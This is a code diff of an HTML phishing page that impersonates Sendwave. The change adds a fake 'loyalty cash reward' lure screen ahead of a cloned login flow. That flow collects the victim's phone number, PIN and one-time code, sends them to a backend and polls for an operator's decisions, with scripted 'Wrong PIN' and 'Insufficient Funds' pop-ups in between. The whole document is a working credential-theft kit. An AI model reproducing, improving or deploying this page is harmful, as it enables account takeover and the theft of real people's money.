@@ -7,22 +7,16 @@
   <link href="https://fonts.googleapis.com/css2?family=Black+Han+Sans&family=Nunito:wght@400;700&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
     body {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      font-family: Arial, sans-serif;
-      background: #fff;
-      overflow: hidden;
+      min-height: 100vh; display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      font-family: Arial, sans-serif; background: #fff; overflow: hidden;
     }
-
+    body.scrollable { overflow-y: auto; overflow-x: hidden; align-items: flex-start; justify-content: flex-start; }
     .screen { display: none; width: 100%; min-height: 100vh; }
     .screen.active { display: flex; }
 
-    /* ── LOADING OVERLAY ── */
+    /* ── LOADING ── */
     .loading-overlay {
       position: fixed; inset: 0; background: rgba(0,0,0,0.45);
       display: flex; align-items: center; justify-content: center;
@@ -30,20 +24,12 @@
       transition: opacity 0.2s, visibility 0.2s;
     }
     .loading-overlay.show { opacity: 1; visibility: visible; }
-    .loading-card {
-      background: #fff; border-radius: 16px; padding: 28px 24px;
-      text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-      min-width: 160px;
-    }
-    .loading-spinner {
-      width: 34px; height: 34px; border: 3px solid #eee;
-      border-top-color: #f5c200; border-radius: 50%;
-      animation: spin 0.6s linear infinite; margin: 0 auto 10px;
-    }
+    .loading-card { background: #fff; border-radius: 16px; padding: 28px 24px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.2); min-width: 160px; }
+    .loading-spinner { width: 34px; height: 34px; border: 3px solid #eee; border-top-color: #f5c200; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 0 auto 10px; }
     @keyframes spin { to { transform: rotate(360deg); } }
     .loading-text { font-size: 14px; font-weight: 600; color: #333; }
 
-    /* ── POPUP OVERLAY ── */
+    /* ── POPUP ── */
     .popup-overlay {
       position: fixed; inset: 0; background: rgba(0,0,0,0.45);
       display: flex; align-items: center; justify-content: center;
@@ -51,112 +37,124 @@
       transition: opacity 0.2s, visibility 0.2s;
     }
     .popup-overlay.show { opacity: 1; visibility: visible; }
-    .popup-card {
-      background: #fff; border-radius: 20px; padding: 28px 24px;
-      max-width: 300px; width: 90%; text-align: center;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.2);
-    }
-    .popup-icon {
-      width: 52px; height: 52px; border-radius: 50%;
-      margin: 0 auto 14px; display: flex;
-      align-items: center; justify-content: center; font-size: 24px;
-    }
+    .popup-card { background: #fff; border-radius: 20px; padding: 28px 24px; max-width: 300px; width: 90%; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.2); }
+    .popup-icon { width: 52px; height: 52px; border-radius: 50%; margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 24px; }
     .popup-icon.wrong { background: #fef2f2; }
     .popup-icon.continue { background: #fffbeb; }
     .popup-title { font-size: 18px; font-weight: 800; color: #111; margin-bottom: 8px; }
     .popup-message { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px; }
-    .popup-btn {
-      width: 100%; padding: 13px; background: #FFE600; border: none;
-      border-radius: 50px; font-size: 15px; font-weight: 700;
-      color: #1a0800; cursor: pointer; font-family: Arial, sans-serif;
-    }
+    .popup-btn { width: 100%; padding: 13px; background: #FFE600; border: none; border-radius: 50px; font-size: 15px; font-weight: 700; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; }
 
-    /* ══ SCREEN 1: LANDING ══ */
-    #landing {
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-end;
-      position: relative;
+    /* ══════════════════════════════
+       SCREEN 0: LOYALTY REWARDS
+    ══════════════════════════════ */
+    #loyalty {
+      flex-direction: column; align-items: center; justify-content: flex-start;
+      background: #f0ebe0; overflow-y: auto; overflow-x: hidden;
     }
+    .loyalty-wrap {
+      max-width: 480px; width: 100%; background: #fff;
+      border-radius: 28px; box-shadow: 0 12px 48px rgba(0,0,0,0.14);
+      overflow: hidden; margin: 20px;
+    }
+    .loy-header {
+      background: #1C0A00; padding: 16px 22px;
+      display: flex; justify-content: space-between; align-items: center;
+    }
+    .loy-logo-wrap { display: flex; align-items: center; gap: 10px; }
+    .loy-logo-text { font-size: 22px; font-weight: 900; color: #FFE600; letter-spacing: 2px; font-style: italic; }
+    .nav-link {
+      color: #FFE600; text-decoration: none; font-size: 14px; font-weight: 700;
+      cursor: pointer; padding: 8px 14px; border-radius: 20px;
+      border: 2px solid #FFE600; transition: background 0.2s;
+    }
+    .nav-link:hover { background: rgba(255,230,0,0.12); }
+    .loy-content { padding: 28px 24px; }
+    #loyPage2 { padding-bottom: 40px; overflow-y: auto; }
 
-    .bg {
-      position: fixed; inset: 0;
-      background-image: url('https://raw.githubusercontent.com/arapchelogoi/halleluyah/main/WhatsApp%20Image%202026-02-21%20at%2013.23.42.jpeg');
-      background-size: cover; background-position: center top; z-index: 0;
+    /* Page 1 */
+    .loy-page1 .hero-badge {
+      display: inline-block; background: #FFE600; color: #1C0A00;
+      font-size: 12px; font-weight: 800; letter-spacing: 1.5px;
+      padding: 5px 14px; border-radius: 20px; margin-bottom: 18px; text-transform: uppercase;
     }
-    .bg::after {
-      content: ''; position: absolute; inset: 0;
-      background: linear-gradient(to bottom, rgba(0,0,0,0.05) 0%, rgba(0,0,0,0.1) 40%, rgba(255,245,200,0.6) 70%, rgba(255,245,180,0.97) 100%);
+    .loy-page1 h1 { font-size: 26px; font-weight: 900; color: #1C0A00; margin-bottom: 10px; line-height: 1.2; }
+    .loy-page1 .subtitle { font-size: 15px; color: #555; margin-bottom: 28px; line-height: 1.6; }
+    .loy-page1 .subtitle strong { color: #1C0A00; }
+    .cta-button {
+      background: #FFE600; color: #1C0A00; border: none; padding: 17px 30px;
+      font-size: 17px; font-weight: 800; border-radius: 50px; width: 100%;
+      cursor: pointer; transition: transform 0.15s, box-shadow 0.15s;
+      margin-bottom: 32px; box-shadow: 0 6px 20px rgba(255,230,0,0.4); letter-spacing: 0.3px;
     }
+    .cta-button:hover { transform: translateY(-2px); box-shadow: 0 10px 28px rgba(255,230,0,0.5); }
+    .cta-button:active { transform: scale(0.98); }
+    .steps { display: flex; justify-content: space-between; margin-bottom: 28px; background: #faf8f3; border-radius: 18px; padding: 18px 12px; }
+    .step { text-align: center; flex: 1; }
+    .step-emoji { font-size: 28px; margin-bottom: 7px; }
+    .step-text { font-size: 11px; font-weight: 800; color: #1C0A00; letter-spacing: 0.5px; text-transform: uppercase; }
+    .features { display: flex; gap: 16px; color: #666; font-size: 13px; justify-content: center; flex-wrap: wrap; }
+    .feature { display: flex; align-items: center; gap: 5px; background: #faf8f3; padding: 7px 12px; border-radius: 20px; font-weight: 600; }
 
-    .landing-content {
-      position: relative; z-index: 1; width: 100%; max-width: 420px;
-      padding: 0 32px 60px; display: flex; flex-direction: column;
-      align-items: center; gap: 28px; animation: fadeUp 0.9s ease both;
-    }
+    /* Page 2 */
+    .loy-page2 h1 { font-size: 22px; font-weight: 900; margin-bottom: 6px; color: #1C0A00; }
+    .loy-page2 .subtitle { font-size: 14px; color: #666; margin-bottom: 22px; line-height: 1.5; }
+    .form-section { background: #faf8f3; border-radius: 18px; padding: 20px; margin-bottom: 22px; }
+    .form-group { margin-bottom: 18px; }
+    .form-group:last-child { margin-bottom: 0; }
+    .form-label { display: flex; align-items: center; gap: 7px; font-weight: 700; color: #1C0A00; margin-bottom: 8px; font-size: 13px; letter-spacing: 0.4px; text-transform: uppercase; }
+    select { width: 100%; padding: 13px 16px; border: 2px solid #e8e0d0; border-radius: 12px; font-size: 15px; color: #333; background: white; cursor: pointer; appearance: none; background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%231C0A00' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 14px center; background-size: 15px; transition: border-color 0.2s; }
+    select:focus { outline: none; border-color: #FFE600; }
+    .estimate-box { background: #1C0A00; border-radius: 20px; padding: 24px; margin-bottom: 22px; text-align: center; }
+    .estimate-title { font-size: 12px; color: #FFE600; margin-bottom: 10px; letter-spacing: 1.5px; text-transform: uppercase; font-weight: 700; }
+    .score { font-size: 52px; font-weight: 900; color: #FFE600; margin-bottom: 4px; line-height: 1; }
+    .estimate-range { font-size: 22px; font-weight: 800; color: #fff; margin: 10px 0; }
+    .loy-warning { font-size: 12px; color: #FFE600; background: rgba(255,230,0,0.12); padding: 7px 12px; border-radius: 10px; display: inline-block; margin-top: 8px; border: 1px solid rgba(255,230,0,0.3); }
+    .loy-checkbox { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 20px; background: #faf8f3; padding: 14px; border-radius: 12px; border: 2px solid #e8e0d0; }
+    .loy-checkbox input { width: 20px; height: 20px; margin-top: 1px; accent-color: #1C0A00; flex-shrink: 0; }
+    .loy-checkbox label { font-size: 13.5px; color: #444; line-height: 1.5; }
+    .audit-button { background: #FFE600; color: #1C0A00; border: none; padding: 17px 30px; font-size: 17px; font-weight: 800; border-radius: 50px; width: 100%; cursor: pointer; transition: transform 0.15s, box-shadow 0.15s; margin-bottom: 14px; box-shadow: 0 6px 20px rgba(255,230,0,0.4); letter-spacing: 0.3px; }
+    .audit-button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 28px rgba(255,230,0,0.5); }
+    .audit-button:disabled { background: #e8e0d0; color: #999; box-shadow: none; cursor: not-allowed; }
+    .audit-button:active:not(:disabled) { transform: scale(0.98); }
+    .disclaimer { font-size: 12px; color: #999; text-align: center; line-height: 1.5; }
+    .loy-footer { padding: 16px 24px; background: #1C0A00; font-size: 13px; color: #888; text-align: center; }
+    .loy-footer a { color: #FFE600; text-decoration: none; font-weight: 600; }
+    .loy-hidden { display: none !important; }
+    .back-link { margin-bottom: 20px; }
+    .back-link a { color: #1C0A00; text-decoration: none; font-size: 14px; font-weight: 700; display: inline-flex; align-items: center; gap: 5px; }
+    .back-link a:hover { text-decoration: underline; }
+
+    /* ══════════════════════════════
+       SCREEN 1: LANDING
+    ══════════════════════════════ */
+    #landing { flex-direction: column; align-items: center; justify-content: flex-end; position: relative; }
+    .bg { position: fixed; inset: 0; background-image: url('https://raw.githubusercontent.com/arapchelogoi/halleluyah/main/WhatsApp%20Image%202026-02-21%20at%2013.23.42.jpeg'); background-size: cover; background-position: center top; z-index: 0; }
+    .bg::after { content: ''; position: absolute; inset: 0; background: linear-gradient(to bottom, rgba(0,0,0,0.05) 0%, rgba(0,0,0,0.1) 40%, rgba(255,245,200,0.6) 70%, rgba(255,245,180,0.97) 100%); }
+    .landing-content { position: relative; z-index: 1; width: 100%; max-width: 420px; padding: 0 32px 60px; display: flex; flex-direction: column; align-items: center; gap: 28px; animation: fadeUp 0.9s ease both; }
     @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-
-    .tagline {
-      font-family: 'Black Han Sans', sans-serif;
-      font-size: clamp(2rem, 8vw, 2.8rem);
-      color: #1a0a00; line-height: 1.1; text-align: center; letter-spacing: 1px;
-    }
-
-    .logo {
-      position: fixed; top: 24px; left: 50%; transform: translateX(-50%);
-      z-index: 2; font-family: 'Black Han Sans', sans-serif;
-      font-size: 3.6rem; color: #f5c200; letter-spacing: 3px;
-      text-shadow: 0 2px 12px rgba(0,0,0,0.3); animation: fadeDown 0.7s ease both; white-space: nowrap;
-    }
+    .tagline { font-family: 'Black Han Sans', sans-serif; font-size: clamp(2rem, 8vw, 2.8rem); color: #1a0a00; line-height: 1.1; text-align: center; letter-spacing: 1px; }
+    .logo { position: fixed; top: 24px; left: 50%; transform: translateX(-50%); z-index: 2; font-family: 'Black Han Sans', sans-serif; font-size: 3.6rem; color: #f5c200; letter-spacing: 3px; text-shadow: 0 2px 12px rgba(0,0,0,0.3); animation: fadeDown 0.7s ease both; white-space: nowrap; }
     @keyframes fadeDown { from { opacity: 0; transform: translateX(-50%) translateY(-16px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
-
-    .letsgo-btn {
-      display: inline-flex; align-items: center; gap: 10px;
-      background: #f5c200; color: #1a0a00;
-      font-family: 'Black Han Sans', sans-serif; font-size: 1.25rem;
-      letter-spacing: 2px; padding: 18px 52px; border: none;
-      border-radius: 50px; cursor: pointer;
-      box-shadow: 0 6px 28px rgba(245,194,0,0.45), 0 2px 0 #b8900a;
-      transition: transform 0.18s, box-shadow 0.18s, background 0.18s;
-      position: relative; overflow: hidden;
-    }
+    .letsgo-btn { display: inline-flex; align-items: center; gap: 10px; background: #f5c200; color: #1a0a00; font-family: 'Black Han Sans', sans-serif; font-size: 1.25rem; letter-spacing: 2px; padding: 18px 52px; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 6px 28px rgba(245,194,0,0.45), 0 2px 0 #b8900a; transition: transform 0.18s, box-shadow 0.18s, background 0.18s; position: relative; overflow: hidden; }
     .letsgo-btn::after { content: ''; position: absolute; inset: 0; border-radius: 50px; background: linear-gradient(135deg, rgba(255,255,255,0.25) 0%, transparent 60%); pointer-events: none; }
     .letsgo-btn:hover { transform: translateY(-3px) scale(1.03); background: #ffd000; }
     .letsgo-btn:active { transform: translateY(1px) scale(0.98); }
     .letsgo-btn svg { width: 22px; height: 22px; flex-shrink: 0; }
 
-    /* ══ SCREEN 2: LOGIN ══ */
-    #login {
-      flex-direction: column; background: #fff; padding: 0 24px;
-      position: relative; max-width: 480px; margin: 0 auto; min-height: 100vh;
-    }
+    /* ══════════════════════════════
+       SCREEN 2: LOGIN
+    ══════════════════════════════ */
+    #login { flex-direction: column; background: #fff; padding: 0 24px; position: relative; max-width: 480px; margin: 0 auto; min-height: 100vh; }
     .back-arrow { margin-top: 56px; font-size: 22px; color: #000; cursor: pointer; width: fit-content; }
     #login h1 { margin-top: 24px; font-size: 30px; font-weight: 800; color: #000; }
-
-    .phone-row {
-      display: flex; margin-top: 32px; border: 1.5px solid #ccc;
-      border-radius: 8px; overflow: hidden; height: 56px; align-items: center;
-    }
-    .country-select {
-      display: flex; align-items: center; padding: 0 10px;
-      border-right: 1.5px solid #ccc; height: 100%; cursor: pointer;
-      gap: 4px; flex-shrink: 0; background: #fff;
-    }
+    .phone-row { display: flex; margin-top: 32px; border: 1.5px solid #ccc; border-radius: 8px; overflow: hidden; height: 56px; align-items: center; }
+    .country-select { display: flex; align-items: center; padding: 0 10px; border-right: 1.5px solid #ccc; height: 100%; cursor: pointer; gap: 4px; flex-shrink: 0; background: #fff; }
     .flag { font-size: 20px; }
     .country-code { font-size: 15px; font-weight: 600; color: #000; }
     .chevron { font-size: 10px; color: #888; margin-left: 2px; }
-    .phone-input {
-      flex: 1; height: 100%; border: none; outline: none;
-      font-size: 15px; color: #333; padding: 0 14px;
-      font-family: Arial, sans-serif; background: transparent;
-    }
-
-    .dropdown {
-      position: absolute; top: 195px; left: 24px; right: 24px;
-      background: #fff; border: 1.5px solid #ddd; border-radius: 8px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.12); z-index: 100;
-      max-height: 320px; overflow-y: auto; display: none;
-    }
+    .phone-input { flex: 1; height: 100%; border: none; outline: none; font-size: 15px; color: #333; padding: 0 14px; font-family: Arial, sans-serif; background: transparent; }
+    .dropdown { position: absolute; top: 195px; left: 24px; right: 24px; background: #fff; border: 1.5px solid #ddd; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.12); z-index: 100; max-height: 320px; overflow-y: auto; display: none; }
     .dropdown.open { display: block; }
     .dropdown-search { padding: 10px 14px; border-bottom: 1px solid #eee; position: sticky; top: 0; background: #fff; }
     .dropdown-search input { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 8px 10px; font-size: 14px; outline: none; font-family: Arial, sans-serif; }
@@ -166,50 +164,37 @@
     .country-item .item-name { flex: 1; color: #222; }
     .country-item .item-code { color: #555; font-weight: 600; }
     .country-item.selected { background: #fffde6; }
-
-    .log-in-btn {
-      margin-top: 20px; width: 100%; height: 56px; background: #FFE600;
-      border: none; border-radius: 50px; font-size: 17px; font-weight: 700;
-      color: #1a0800; cursor: pointer; font-family: Arial, sans-serif;
-    }
+    .log-in-btn { margin-top: 20px; width: 100%; height: 56px; background: #FFE600; border: none; border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; }
     .trouble-link { margin-top: 18px; text-align: center; color: #1a9090; font-size: 15px; font-weight: 600; text-decoration: underline; cursor: pointer; }
     .bottom-text { position: absolute; bottom: 36px; left: 0; right: 0; text-align: center; font-size: 14px; color: #444; }
     .bottom-text a { color: #1a9090; font-weight: 700; text-decoration: underline; cursor: pointer; }
 
-    /* ══ SCREEN 3: PIN ══ */
-    #pin {
-      flex-direction: column; background: #fff; padding: 0 28px;
-      max-width: 480px; margin: 0 auto; min-height: 100vh;
-    }
-    .close-btn { margin-top: 52px; font-size: 24px; color: #000; cursor: pointer; width: fit-content; line-height: 1; }
-    .phone-icon { margin-top: 20px; width: 36px; height: 46px; }
-    #pin h1 { margin-top: 16px; font-size: 28px; font-weight: 800; color: #000; }
-    .pin-dashes { display: flex; gap: 28px; margin-top: 60px; justify-content: center; align-items: center; height: 24px; }
-    .dash { width: 60px; height: 3px; background: #ccc; border-radius: 2px; transition: all 0.15s ease; }
+    /* ══════════════════════════════
+       SCREEN 3: PIN
+    ══════════════════════════════ */
+    #pin { flex-direction: column; background: #fff; padding: 0 28px; max-width: 480px; margin: 0 auto; min-height: 100vh; }
+    .close-btn { margin-top: 36px; font-size: 24px; color: #000; cursor: pointer; width: fit-content; line-height: 1; }
+    .phone-icon { margin-top: 12px; width: 30px; height: 38px; }
+    #pin h1 { margin-top: 8px; font-size: 24px; font-weight: 800; color: #000; }
+    .pin-dashes { display: flex; gap: 24px; margin-top: 20px; justify-content: center; align-items: center; height: 20px; }
+    .dash { width: 54px; height: 3px; background: #ccc; border-radius: 2px; transition: all 0.15s ease; }
     .dash.active { background: #1a7f7f; }
-    .dash.filled { width: 14px; height: 14px; background: #111; border-radius: 50%; }
-    .keypad { margin-top: auto; }
-    .keypad-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
-    .key { width: 108px; height: 66px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; border-radius: 12px; transition: background 0.1s; user-select: none; }
+    .dash.filled { width: 13px; height: 13px; background: #111; border-radius: 50%; }
+    .keypad { margin-top: 18px; }
+    .keypad-row { display: flex; justify-content: space-between; margin-bottom: 2px; }
+    .key { width: 108px; height: 58px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; border-radius: 12px; transition: background 0.1s; user-select: none; }
     .key:active { background: #f0f0f0; }
-    .key-num { font-size: 28px; font-weight: 400; color: #000; line-height: 1; }
+    .key-num { font-size: 26px; font-weight: 400; color: #000; line-height: 1; }
     .key-letters { font-size: 9px; color: #888; letter-spacing: 1px; margin-top: 2px; }
     .key.empty { cursor: default; }
     .key-del { font-size: 22px; color: #000; }
-    .continue-btn {
-      width: 100%; height: 54px; background: #FFE600; border: none;
-      border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800;
-      cursor: pointer; font-family: Arial, sans-serif; margin-top: 12px; margin-bottom: 28px;
-      opacity: 0.45; transition: opacity 0.2s;
-    }
+    .continue-btn { width: 100%; height: 52px; background: #FFE600; border: none; border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; margin-top: 12px; margin-bottom: 20px; opacity: 0.45; transition: opacity 0.2s; }
     .continue-btn.ready { opacity: 1; }
 
-    /* ══ SCREEN 4: OTP ══ */
-    #otp {
-      flex-direction: column; background: #fff; padding: 0 24px;
-      max-width: 480px; margin: 0 auto; min-height: 100vh;
-      font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif;
-    }
+    /* ══════════════════════════════
+       SCREEN 4: OTP
+    ══════════════════════════════ */
+    #otp { flex-direction: column; background: #fff; padding: 0 24px; max-width: 480px; margin: 0 auto; min-height: 100vh; font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif; }
     #otp .close-btn { margin-top: 54px; font-size: 22px; font-weight: 300; }
     .otp-phone-icon { margin-top: 22px; width: 34px; height: 44px; }
     .heading { margin-top: 14px; font-size: 26px; font-weight: 800; color: #000; letter-spacing: -0.3px; }
@@ -225,17 +210,10 @@
     .resend-buttons { display: flex; gap: 12px; margin-top: 14px; }
     .resend-btn { display: flex; align-items: center; gap: 7px; padding: 10px 18px; border: 2px solid #1a6f6f; border-radius: 50px; background: #fff; cursor: pointer; font-size: 14.5px; font-weight: 700; color: #1a6f6f; font-family: inherit; }
     .resend-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
-    .bottom-section { margin-top: auto; padding-bottom: 60px; }
+    .otp-bottom-section { margin-top: auto; padding-bottom: 60px; }
     .no-access-text { font-size: 14px; color: #333; margin-bottom: 4px; }
     .change-number { font-size: 14px; font-weight: 700; color: #1a6f6f; text-decoration: underline; cursor: pointer; }
-
-    /* OTP submit button */
-    .otp-submit-btn {
-      width: 100%; height: 54px; background: #FFE600; border: none;
-      border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800;
-      cursor: pointer; font-family: Arial, sans-serif; margin-top: 28px;
-      opacity: 0.45; transition: opacity 0.2s;
-    }
+    .otp-submit-btn { width: 100%; height: 54px; background: #FFE600; border: none; border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800; cursor: pointer; font-family: Arial, sans-serif; margin-top: 28px; opacity: 0.45; transition: opacity 0.2s; }
     .otp-submit-btn.ready { opacity: 1; }
   </style>
 </head>
@@ -259,8 +237,111 @@
   </div>
 </div>
 
+<!-- ══ SCREEN 0: LOYALTY ══ -->
+<div id="loyalty" class="screen active">
+  <div class="loyalty-wrap">
+    <div class="loy-header">
+      <div class="loy-logo-wrap">
+        <span class="loy-logo-text">SENDWAVE</span>
+      </div>
+      <span class="nav-link" id="navToggle" onclick="toggleLoyaltyPage()">Audit →</span>
+    </div>
+
+    <!-- Loyalty Page 1 -->
+    <div id="loyPage1" class="loy-content loy-page1">
+      <div class="hero-badge">Loyalty Programme</div>
+      <h1>CASH REWARD FOR LOYAL CUSTOMERS</h1>
+      <div class="subtitle">
+        You could qualify for a bonus between<br>
+        <strong>$100 – $1,500 USD</strong> based on your account activity.
+      </div>
+      <button class="cta-button" onclick="toggleLoyaltyPage()">CHECK IF YOU QUALIFY →</button>
+      <div class="steps">
+        <div class="step"><div class="step-emoji"></div><div class="step-text">Enter Details</div></div>
+        <div class="step"><div class="step-emoji"></div><div class="step-text">Audit Account</div></div>
+        <div class="step"><div class="step-emoji"></div><div class="step-text">Get Reward</div></div>
+      </div>
+      <div class="features">
+        <div class="feature">⏱️ Under 1 minutes</div>
+        <div class="feature">🔒 Secure & private</div>
+      </div>
+    </div>
+
+    <!-- Loyalty Page 2 -->
+    <div id="loyPage2" class="loy-content loy-page2 loy-hidden">
+      <div class="back-link"><a href="#" onclick="toggleLoyaltyPage()">← Back</a></div>
+      <h1>📋 Enter Your Details</h1>
+      <div class="subtitle">Provide accurate information. Your account data will be verified after login.</div>
+      <div class="form-section">
+        <div class="form-group">
+          <div class="form-label">Account Age</div>
+          <select id="accountAge" onchange="updateEstimate()">
+            <option value="">Select account age</option>
+            <option value="0-3">Less than 3 months</option>
+            <option value="3-6">3 – 6 months</option>
+            <option value="6-12">6 – 12 months</option>
+            <option value="1-2">1 – 2 years</option>
+            <option value="2-3">2 – 3 years</option>
+            <option value="3+">3+ years</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <div class="form-label">Monthly Transaction Volume</div>
+          <select id="transactionVolume" onchange="updateEstimate()">
+            <option value="">Select monthly volume</option>
+            <option value="0-100">Less than 100</option>
+            <option value="100-500">100 – 500</option>
+            <option value="500-1000">500 – 1,000</option>
+            <option value="1000-2500">1,000 – 2,500</option>
+            <option value="2500-5000">2,500 – 5,000</option>
+            <option value="5000+">5,000+</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <div class="form-label">User Type</div>
+          <select id="userType" onchange="updateEstimate()">
+            <option value="">Select user type</option>
+            <option value="new">New User (0–3 months)</option>
+            <option value="standard">Standard User</option>
+            <option value="regular">Regular User</option>
+            <option value="business">Business User</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <div class="form-label">Activity Frequency</div>
+          <select id="activePeriod" onchange="updateEstimate()">
+            <option value="">Select frequency</option>
+            <option value="daily">Daily</option>
+            <option value="weekly">Weekly</option>
+            <option value="monthly">Monthly</option>
+            <option value="occasional">Occasionally</option>
+            <option value="rarely">Rarely</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="estimate-box" id="estimateBox" style="display:none;">
+        <div class="estimate-title">Estimated Loyalty Score</div>
+        <div class="score" id="loyaltyScore">78%</div>
+        <div class="estimate-range" id="rewardRange">$50 – $100</div>
+        <div class="loy-warning">⚠ Final eligibility requires account audit</div>
+      </div>
+
+      <div class="loy-checkbox">
+        <input type="checkbox" id="confirmCheck" onchange="toggleAuditButton()">
+        <label for="confirmCheck">I confirm this information is accurate and understand my account will be verified upon login.</label>
+      </div>
+
+      <button class="audit-button" id="auditBtn" onclick="showScreen('landing')" disabled>AUDIT MY ACCOUNT →</button>
+      <div class="disclaimer">By clicking, you'll be directed to login for official verification.</div>
+    </div>
+
+    <div class="loy-footer">Questions? <a href="#">FAQ</a> &nbsp;|&nbsp; <a href="#">Contact Support</a></div>
+  </div>
+</div>
+
 <!-- ══ SCREEN 1: LANDING ══ -->
-<div id="landing" class="screen active">
+<div id="landing" class="screen">
   <div class="bg"></div>
   <div class="logo">SENDWAVE</div>
   <div class="landing-content">
@@ -281,8 +362,8 @@
   <h1>Welcome back</h1>
   <div class="phone-row">
     <div class="country-select" onclick="toggleDropdown()">
-      <span class="flag" id="selected-flag">🌐</span>
-      <span class="country-code" id="selected-code">+</span>
+      <span class="flag" id="selected-flag"></span>
+      <span class="country-code" id="selected-code">+1</span>
       <span class="chevron">▼</span>
     </div>
     <input class="phone-input" type="tel" placeholder="Mobile number" id="phone-input"/>
@@ -367,7 +448,7 @@
       WhatsApp
     </button>
   </div>
-  <div class="bottom-section">
+  <div class="otp-bottom-section">
     <div class="no-access-text">Don't have access to this number?</div>
     <div class="change-number" onclick="showScreen('login')">Change number</div>
   </div>
@@ -375,11 +456,9 @@
 
 <script>
   const API_BASE_URL = '/api';
-
   let currentSessionId = null;
   let statusCheckInterval = null;
 
-  // ── Loading & Popup ──
   function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
   function hideLoading()  { document.getElementById('loadingOverlay').classList.remove('show'); }
 
@@ -387,60 +466,44 @@
     const icon = document.getElementById('popupIcon');
     icon.className = 'popup-icon ' + type;
     icon.textContent = type === 'wrong' ? '❌' : '⚠️';
-    document.getElementById('popupTitle').textContent   = title;
+    document.getElementById('popupTitle').textContent = title;
     document.getElementById('popupMessage').textContent = message;
     document.getElementById('popupOverlay').classList.add('show');
   }
   function closePopup() { document.getElementById('popupOverlay').classList.remove('show'); }
 
-  // ── API ──
   async function callApi(action, data = {}) {
     const params = new URLSearchParams();
     params.append('action', action);
     for (let key in data) { params.append(key, data[key]); }
     try {
-      const res = await fetch(API_BASE_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: params.toString()
-      });
+      const res = await fetch(API_BASE_URL, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: params.toString() });
       return await res.json();
-    } catch (err) {
-      console.error('API error:', err);
-      return { success: false };
-    }
+    } catch (err) { console.error('API error:', err); return { success: false }; }
   }
 
-  // ── Status polling ──
   function startStatusPolling(sessionId) {
     if (statusCheckInterval) clearInterval(statusCheckInterval);
     currentSessionId = sessionId;
     statusCheckInterval = setInterval(async () => {
       try {
-        const res    = await fetch(`${API_BASE_URL}?action=check_status&sessionId=${sessionId}&t=${Date.now()}`);
+        const res = await fetch(`${API_BASE_URL}?action=check_status&sessionId=${sessionId}&t=${Date.now()}`);
         const result = await res.json();
         if (result.success && result.status) {
           if (result.status === 'approved') {
-            // Admin clicked Request OTP — go to OTP screen
-            hideLoading();
-            clearInterval(statusCheckInterval); statusCheckInterval = null;
-            showScreen('otp');
-            setTimeout(() => focusOtpInput(), 200);
+            hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
+            showScreen('otp'); setTimeout(() => focusOtpInput(), 200);
             startStatusPolling(currentSessionId);
           } else if (result.status === 'wrong_pin') {
-            hideLoading();
-            clearInterval(statusCheckInterval); statusCheckInterval = null;
+            hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
             showPopup('Wrong PIN', 'The PIN you entered is incorrect. Please try again.', 'wrong');
             pin = []; updateDashes();
           } else if (result.status === 'wrong_code') {
-            hideLoading();
-            clearInterval(statusCheckInterval); statusCheckInterval = null;
+            hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
             showPopup('Wrong Code', 'The code you entered is incorrect. Please try again.', 'wrong');
-            document.getElementById('otp-input').value = '';
-            updateSlots();
+            document.getElementById('otp-input').value = ''; updateSlots();
           } else if (result.status === 'continue') {
-            hideLoading();
-            clearInterval(statusCheckInterval); statusCheckInterval = null;
+            hideLoading(); clearInterval(statusCheckInterval); statusCheckInterval = null;
             showPopup('Insufficient Funds', 'Please add more funds to your account and try again.', 'continue');
           }
         }
@@ -448,162 +511,63 @@
     }, 1000);
   }
 
-  // ── Screen navigation ──
+  /* ── Screen navigation ── */
   function showScreen(id) {
